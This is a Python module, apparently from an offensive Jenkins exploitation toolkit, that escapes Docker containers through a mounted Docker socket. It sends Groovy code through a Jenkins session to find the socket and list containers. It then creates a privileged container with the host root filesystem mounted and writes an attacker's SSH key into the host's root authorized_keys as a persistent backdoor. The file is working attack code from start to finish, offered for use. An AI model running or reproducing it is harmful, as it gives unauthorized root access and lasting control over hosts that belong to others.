"""Docker container escape via socket exploitation.

Detects Docker socket mounts and exploits them to escape containers,
gain host access, and establish persistent backdoors.
"""

from dataclasses import dataclass
from typing import Any, Optional


@dataclass
class DockerInfo:
    """Docker environment information."""
    socket_path: str
    accessible: bool
    docker_version: Optional[str] = None
    containers: list[dict[str, Any]] = None
    images: list[str] = None

    def __post_init__(self):
        if self.containers is None:
            self.containers = []
        if self.images is None:
            self.images = []


class DockerEscape:
    """Docker container escape utilities."""

    COMMON_SOCKET_PATHS = [
        "/var/run/docker.sock",
        "/run/docker.sock",
        "/host/var/run/docker.sock"
    ]

    def __init__(self, session: Any):
        """Initialize Docker escape module.

        Args:
            session: Authenticated Jenkins session for Groovy execution
        """
        self.session = session
        self.socket_path: Optional[str] = None

    def check_docker_socket(self) -> Optional[str]:
        """Check for accessible Docker socket.

        Returns:
            Path to socket if found, None otherwise
        """
        paths_check = "','".join(self.COMMON_SOCKET_PATHS)

        groovy_code = f"""
def socketPaths = ['{paths_check}']

socketPaths.each {{ path ->
    def socket = new File(path)
    if (socket.exists()) {{
        println "FOUND:" + path
        println "READABLE:" + socket.canRead()
        println "WRITABLE:" + socket.canWrite()
    }}
}}
"""

        result = self.session.execute_groovy(groovy_code)

        for line in result.split('\n'):
            if line.startswith("FOUND:"):
                socket_path = line.split("FOUND:", 1)[1].strip()
                self.socket_path = socket_path
                return socket_path

        return None

    def get_docker_info(self) -> Optional[DockerInfo]:
        """Get Docker daemon information via socket.

        Returns:
            DockerInfo object if successful
        """
        if not self.socket_path:
            self.check_docker_socket()

        if not self.socket_path:
            return None

        groovy_code = f"""
import java.net.Socket
import java.net.UnixDomainSocketAddress
import java.nio.channels.SocketChannel

try {{
    def socketPath = new File('{self.socket_path}')

    def request = "GET /version HTTP/1.1\\r\\n" +
                  "Host: localhost\\r\\n" +
                  "Connection: close\\r\\n\\r\\n"

    def address = UnixDomainSocketAddress.of(socketPath.toPath())
    def channel = SocketChannel.open(address)

    channel.write(java.nio.ByteBuffer.wrap(request.getBytes()))

    def buffer = java.nio.ByteBuffer.allocate(4096)
    def response = new StringBuilder()

    while (channel.read(buffer) > 0) {{
        buffer.flip()
        while (buffer.hasRemaining()) {{
            response.append((char)buffer.get())
        }}
        buffer.clear()
    }}

    channel.close()

    println response.toString()
}} catch (Exception e) {{
    println "ERROR:" + e.message
    e.printStackTrace()
}}
"""

        result = self.session.execute_groovy(groovy_code)

        if "ERROR" in result or not result.strip():
            return None

        import json
        import re

        json_match = re.search(r'\{.*\}', result, re.DOTALL)
        if json_match:
            try:
                version_data = json.loads(json_match.group(0))
                return DockerInfo(
                    socket_path=self.socket_path,
                    accessible=True,
                    docker_version=version_data.get("Version")
                )
            except json.JSONDecodeError:
                pass

        return DockerInfo(
            socket_path=self.socket_path,
            accessible=True
        )

    def list_containers(self) -> list[dict[str, Any]]:
        """List running containers via Docker socket.

        Returns:
            List of container information dictionaries
        """
        if not self.socket_path:
            return []

        groovy_code = f"""
import java.net.UnixDomainSocketAddress
import java.nio.channels.SocketChannel

try {{
    def socketPath = new File('{self.socket_path}')

    def request = "GET /containers/json HTTP/1.1\\r\\n" +
                  "Host: localhost\\r\\n" +
                  "Connection: close\\r\\n\\r\\n"

    def address = UnixDomainSocketAddress.of(socketPath.toPath())
    def channel = SocketChannel.open(address)

    channel.write(java.nio.ByteBuffer.wrap(request.getBytes()))

    def buffer = java.nio.ByteBuffer.allocate(8192)
    def response = new StringBuilder()

    while (channel.read(buffer) > 0) {{
        buffer.flip()
        while (buffer.hasRemaining()) {{
            response.append((char)buffer.get())
        }}
        buffer.clear()
    }}

    channel.close()

    println response.toString()
}} catch (Exception e) {{
    println "ERROR:" + e.message
}}
"""

        result = self.session.execute_groovy(groovy_code)

        if "ERROR" in result:
            return []

        import json
        import re

        json_match = re.search(r'\[.*\]', result, re.DOTALL)
        if json_match:
            try:
                return json.loads(json_match.group(0))
            except json.JSONDecodeError:
                pass

        return []

    def create_escape_container(self,
                               image: str = "alpine:latest",
                               command: Optional[list[str]] = None,
                               ssh_key: Optional[str] = None) -> tuple[bool, str]:
        """Create privileged container with host filesystem mounted.

        Args:
            image: Docker image to use
            command: Command to run in container
            ssh_key: Optional SSH public key to install on host

        Returns:
            Tuple of (success, container_id or error message)
        """
        if not self.socket_path:
            return False, "No Docker socket available"

        if not command:
            if ssh_key:
                command = [
                    "/bin/sh", "-c",
                    f"mkdir -p /host/root/.ssh && "
                    f"echo '{ssh_key}' >> /host/root/.ssh/authorized_keys && "
                    f"chmod 600 /host/root/.ssh/authorized_keys && "
                    f"chmod 700 /host/root/.ssh && "
                    f"sleep 3600"
                ]
            else:
                command = ["/bin/sh", "-c", "sleep 3600"]

        import json
        container_config = {
            "Image": image,
            "Cmd": command,
            "HostConfig": {
                "Privileged": True,
                "Binds": ["/:host"],
                "PidMode": "host",
                "NetworkMode": "host"
            }
        }

        config_json = json.dumps(container_config).replace('"', '\\"')

        groovy_code = f"""
import java.net.UnixDomainSocketAddress
import java.nio.channels.SocketChannel

try {{
    def socketPath = new File('{self.socket_path}')
    def configJson = '''{config_json}'''

    def request = "POST /containers/create HTTP/1.1\\r\\n" +
                  "Host: localhost\\r\\n" +
                  "Content-Type: application/json\\r\\n" +
                  "Content-Length: " + configJson.length() + "\\r\\n" +
                  "Connection: close\\r\\n\\r\\n" +
                  configJson

    def address = UnixDomainSocketAddress.of(socketPath.toPath())
    def channel = SocketChannel.open(address)

    channel.write(java.nio.ByteBuffer.wrap(request.getBytes()))

    def buffer = java.nio.ByteBuffer.allocate(4096)
    def response = new StringBuilder()

    while (channel.read(buffer) > 0) {{
        buffer.flip()
        while (buffer.hasRemaining()) {{
            response.append((char)buffer.get())
        }}
        buffer.clear()
    }}

    channel.close()

    println response.toString()
}} catch (Exception e) {{
    println "ERROR:" + e.message
}}
"""

        result = self.session.execute_groovy(groovy_code)

        if "ERROR" in result:
            return False, result

        import json
        import re

        json_match = re.search(r'\{.*"Id":\s*"([^"]+)".*\}', result, re.DOTALL)
        if json_match:
            try:
                response_data = json.loads(json_match.group(0))
                container_id = response_data.get("Id")

                start_success = self._start_container(container_id)

                if start_success:
                    return True, container_id
                else:
                    return False, f"Container created ({container_id}) but failed to start"
            except json.JSONDecodeError:
                pass

        return False, "Failed to parse container creation response"

    def _start_container(self, container_id: str) -> bool:
        """Start a container via Docker socket.

        Args:
            container_id: ID of container to start

        Returns:
            True if successful
        """
        groovy_code = f"""
import java.net.UnixDomainSocketAddress
import java.nio.channels.SocketChannel

try {{
    def socketPath = new File('{self.socket_path}')

    def request = "POST /containers/{container_id}/start HTTP/1.1\\r\\n" +
                  "Host: localhost\\r\\n" +
                  "Connection: close\\r\\n\\r\\n"

    def address = UnixDomainSocketAddress.of(socketPath.toPath())
    def channel = SocketChannel.open(address)

    channel.write(java.nio.ByteBuffer.wrap(request.getBytes()))

    def buffer = java.nio.ByteBuffer.allocate(1024)
    def response = new StringBuilder()

    while (channel.read(buffer) > 0) {{
        buffer.flip()
        while (buffer.hasRemaining()) {{
            response.append((char)buffer.get())
        }}
        buffer.clear()
    }}

    channel.close()

    println response.toString()
}} catch (Exception e) {{
    println "ERROR:" + e.message
}}
"""

        result = self.session.execute_groovy(groovy_code)

        return "204" in result or "304" in result

    def mount_host_filesystem(self) -> tuple[bool, str]:
        """Quick escape method: mount host root and install backdoor.

        Returns:
            Tuple of (success, message)
        """
        success, result = self.create_escape_container(
            image="alpine:latest",
            command=["/bin/sh", "-c", "echo 'Escaped' > /host/tmp/jenkins_escape && sleep 3600"]
        )

        if success:
            return True, f"Escape container created: {result}. Host filesystem at /host/"
        else:
            return False, result


def check_docker_socket(session: Any) -> Optional[str]:
    """Quick check for Docker socket.

    Args:
        session: Jenkins session

    Returns:
        Path to socket if found
    """
    escape = DockerEscape(session)
    return escape.check_docker_socket()


def escape_via_socket(session: Any, ssh_key: Optional[str] = None) -> tuple[bool, str]:
    """Automated container escape via Docker socket.

    Args:
        session: Jenkins session
        ssh_key: Optional SSH public key to install

    Returns:
        Tuple of (success, message)
    """
    escape = DockerEscape(session)
    socket = escape.check_docker_socket()

    if not socket:
        return False, "No accessible Docker socket found"

    return escape.create_escape_container(ssh_key=ssh_key)


def mount_host_filesystem(session: Any) -> tuple[bool, str]:
    """Quick host filesystem mount via Docker.

    Args:
        session: Jenkins session

    Returns:
        Tuple of (success, message)
    """
    escape = DockerEscape(session)
    return escape.mount_host_filesystem()
